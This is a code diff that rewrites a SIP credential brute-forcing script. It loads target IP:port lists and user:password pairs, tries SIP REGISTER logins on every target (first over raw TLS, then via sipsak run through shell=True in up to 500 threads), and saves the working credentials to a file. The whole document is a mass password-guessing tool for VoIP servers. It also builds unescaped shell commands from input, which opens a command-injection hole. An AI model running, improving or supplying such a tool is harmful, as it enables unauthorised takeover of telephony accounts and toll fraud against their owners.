@@ -1,87 +1,89 @@
-import sys
-import asyncio
-import socket
-import ssl
+import os
+import subprocess
+import threading
+import re
 
-async def check_sip(host, port, user, password):
+# File containing user:password pairs in the format "user:password"
+user_pass_file = "User_Pass"
+
+# File containing a list of targets (IP addresses and ports)
+ip_file = "ip.txt"
+
+# File to save successful results
+success_results = "success_results.txt"
+
+# Regular expression for matching "200 OK" or "202 Accepted"
+response_pattern = re.compile(r"(200 OK|202 Accepted)")
+
+def register_user(user, password, target):
+    # Execute the sipsak command to register the user based on the user and password and the target
+    cmd = f"sipsak --from sip:{user}@{target} -u {user} -a {password} -p {target} -s sip:{user}@{target} -i -vvv -E tls"
     try:
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-        context.verify_mode = ssl.CERT_NONE  # Disable certificate verification (for testing purposes only)
+        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
 
-        reader, writer = await asyncio.open_connection(host, port, ssl=context)
-        msg = f'REGISTER sip:{host} SIP/2.0\r\n' \
-              f'Via: SIP/2.0/TLS {host};branch=z9hG4bK{generate_random_string(7)};rport\r\n' \
-              f'From: <sip:{user}@{host}>;tag={generate_random_string(8)}\r\n' \
-              f'To: <sip:{user}@{host}>\r\n' \
-              f'Contact: <sip:{user}@{host}>\r\n' \
-              f'Call-ID: {generate_random_string(13)}\r\n' \
-              f'CSeq: 20 REGISTER\r\n' \
-              f'User-Agent: pplsip\r\n' \
-              f'Expires: 600\r\n' \
-              f'Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, NOTIFY, MESSAGE, SUBSCRIBE, INFO\r\n' \
-              f'Content-Length: 0\r\n\r\n'
+        # Check the response using the regular expression pattern
+        response_match = response_pattern.search(result.stdout.decode("utf-8"))
 
-        writer.write(msg.encode())
-        await writer.drain()
+        if response_match:
+            # If a successful response is found, register the result in the success_results file
+            with open(success_results, "a") as file:
+                file.write(f"Target: {target}\n")
+                file.write(f"Port: {target.split(':')[1]}\n")
+                file.write(f"User: {user}\n")
+                file.write(f"Password: {password}\n")
+                file.write(f"Response: {response_match.group(0)}\n")
+                file.write("\n")
+    except subprocess.TimeoutExpired:
+        print(f"Connection to {target} timed out.")
+        return
 
-        response = (await asyncio.wait_for(reader.read(8192), timeout=5)).decode()
+def register_users_thread(users, targets):
+    for user_pass in users:
+        user, password = user_pass.strip().split(":")
+        for target in targets:
+            target = target.strip()
+            register_user(user, password, target)
 
-        if "200 OK" in response:
-            print(f"SUCCESS: {host}:{port} {user}:{password}")
-            with open("results.txt", "a") as result_file:
-                result_file.write(f"{host}:{port} {user}:{password}\n")
-        else:
-            print(f"FAILED: {host}:{port} {user}:{password}")
+def main():
+    # Read user:password pairs from the User_Pass file
+    with open(user_pass_file, "r") as users_file:
+        users = users_file.readlines()
 
-        writer.close()
-        await writer.wait_closed()
+    # Read targets from the ip.txt file
+    with open(ip_file, "r") as targets_file:
+        targets = targets_file.readlines()
 
-    except asyncio.TimeoutError:
-        print(f"TIMEOUT: {host}:{port} {user}:{password}")
-    except Exception as e:
-        print(f"ERROR: {host}:{port} {user}:{password} - {str(e)}")
+    # Remove any empty or whitespace-only lines from targets list
+    targets = [target.strip() for target in targets if target.strip()]
 
-def generate_random_string(length):
-    import random
-    import string
-    return ''.join(random.choices(string.ascii_letters, k=length))
+    if not users or not targets:
+        print("Error: User/Password or Targets lists are empty or file not found.")
+        return
+
+    # Create a list of threads
+    threads = []
+    num_threads = 500  # You can adjust the number of threads here
+
+    # Make sure targets list is not empty
+    if len(targets) < 1:
+        print("Error: Targets list is empty.")
+        return
+
+    if len(targets) < num_threads:
+        num_threads = len(targets)
+
+    # Split the list of targets into chunks for each thread
+    targets_chunked = [targets[i:i + len(targets) // num_threads] for i in range(0, len(targets), len(targets) // num_threads)]
+
+    # Start and join threads
+    for i in range(num_threads):
+        thread = threading.Thread(target=register_users_thread, args=(users, targets_chunked[i]))
+        thread.start()
+        threads.append(thread)
+
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join()
 
 if __name__ == "__main__":
-    if len(sys.argv) < 5:
-        print("Usage: script.py <max_concurrent> <type> <IpsFile> <UserPassFile>")
-        sys.exit(1)
-
-    max_concurrent = int(sys.argv[1])
-    type_val = int(sys.argv[2])
-    ips_file = sys.argv[3]
-    user_pass_file = sys.argv[4]
-
-    found_ip = []
-
-    with open(ips_file, "r") as ips_file_obj:
-        found_ip = [line.strip() for line in ips_file_obj]
-
-    with open(user_pass_file, "r") as user_pass_file_obj:
-        user_pass_list = [line.strip() for line in user_pass_file_obj]
-
-if type_val == 1:
-    semaphore = asyncio.Semaphore(max_concurrent)
-    
-    async def check_sip_with_semaphore(host, port, user, password):
-        async with semaphore:
-            await check_sip(host, int(port), user, password)
-
-    loop = asyncio.get_event_loop()
-    tasks = [check_sip_with_semaphore(host, port, user, password) for user_pass in user_pass_list for host, port, user, password in [ip.split(":") + user_pass.split(":") for ip in found_ip]]
-    loop.run_until_complete(asyncio.gather(*tasks))
-    loop.close()
-
-elif type_val == 2:  # 
-    print("Method type 2 not supported yet.")
-    sys.exit(1)
-
-else:
-    print("Invalid type value. Use 1 for user:pass combo or 2 for other methods.")
-    sys.exit(1)
-
-print("\n----------Done----------\n")
+    main()
